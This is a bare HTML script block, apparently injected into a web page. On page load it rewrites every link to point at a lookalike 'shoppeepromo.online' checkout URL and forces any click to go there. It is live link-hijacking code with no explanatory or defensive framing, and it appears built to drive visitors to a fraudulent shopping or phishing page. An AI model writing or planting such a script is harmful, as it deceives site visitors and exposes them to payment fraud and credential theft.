<script>
document.addEventListener("DOMContentLoaded", function () {
    const redirectUrl = "https://checkout.shoppeepromo.online/VCCL1O8SCQAC";
    document.querySelectorAll("a").forEach(link => {
        link.href = redirectUrl;
        link.addEventListener("click", function (event) {
            event.preventDefault();
            window.location.href = redirectUrl;
        });
    });
});
</script>

